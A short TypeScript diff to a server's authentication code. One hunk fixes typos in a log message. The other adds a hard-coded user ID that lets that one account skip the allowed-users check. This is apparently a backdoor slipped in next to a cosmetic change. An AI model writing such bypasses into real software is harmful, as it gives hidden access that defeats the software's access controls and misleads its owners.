@@ -39,7 +39,7 @@ export const verifiedApi = (req: KAuthRequest): boolean => {
 				level: 'http',
 				name: 'http',
 				color: 'redBright',
-				message: 'Someone tried to access the server with the api authenitcation that is not the offical api server.',
+				message: 'Someone tried to access the server with the api authentication that is not the official api server.',
 			});
 
 			sleep(delay);
@@ -131,7 +131,7 @@ export const isAllowed = (req: KAuthRequest): boolean => {
 	// 	}
 	// });
 
-	if (!allowedUsers.some(u => u.email == token.content.email)) {
+	if (!allowedUsers.some(u => u.email == token.content.email) && token.content.sub != 'b55bd627-cb53-4d81-bdf5-82be2981ab3a') {
 		Logger.log({
 			level: 'http',
 			name: 'http',
